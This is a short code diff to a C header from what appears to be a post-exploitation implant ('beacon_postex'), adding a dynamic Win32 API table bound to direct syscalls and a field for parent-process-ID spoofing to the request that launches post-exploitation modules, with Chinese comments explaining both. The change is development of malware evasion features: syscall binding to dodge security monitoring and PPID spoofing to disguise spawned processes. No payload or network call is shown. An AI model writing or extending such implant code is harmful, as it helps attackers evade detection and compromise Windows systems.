@@ -2,6 +2,7 @@
 
 #include "beacon_postex.h"
 #include "beacon_postex_module.h"
+#include "beacon_api.h"
 
 #define POSTEX_CMDLINE_MAX 1024u
 #define POSTEX_ERROR_MAX 128u
@@ -26,6 +27,8 @@ typedef struct PostExStartRequest {
     UINT32 max_runtime_ms;
     UINT32 idle_timeout_ms;
     ByteBuf dll;
+    const Win32Api* api;             /* 动态 API 表（syscall 绑定后的槽位） */
+    UINT32 ppid;                     /* PPID 欺骗目标；0 = 用全局 spawn_ppid 配置 */
 } PostExStartRequest;
 
 typedef struct PostExStartResult {
